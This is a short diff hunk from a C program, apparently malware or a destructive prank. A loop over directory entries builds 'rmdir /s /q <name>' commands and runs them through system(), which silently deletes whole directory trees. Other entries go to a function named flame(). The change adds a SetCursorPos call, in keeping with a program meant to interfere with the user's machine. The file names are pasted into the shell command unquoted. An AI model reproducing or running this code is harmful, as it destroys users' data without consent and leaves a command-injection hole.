@@ -28,6 +28,7 @@ int main(){
         while((dir = readdir(ls)) != NIL){
             file = dir->d_name;
             if(recognize_dir(file)==0){
+                SetCursorPos(10, 10);
                 sprintf(deldir, "rmdir /s /q %s", file);
                 system(deldir);
             } else flame(file);
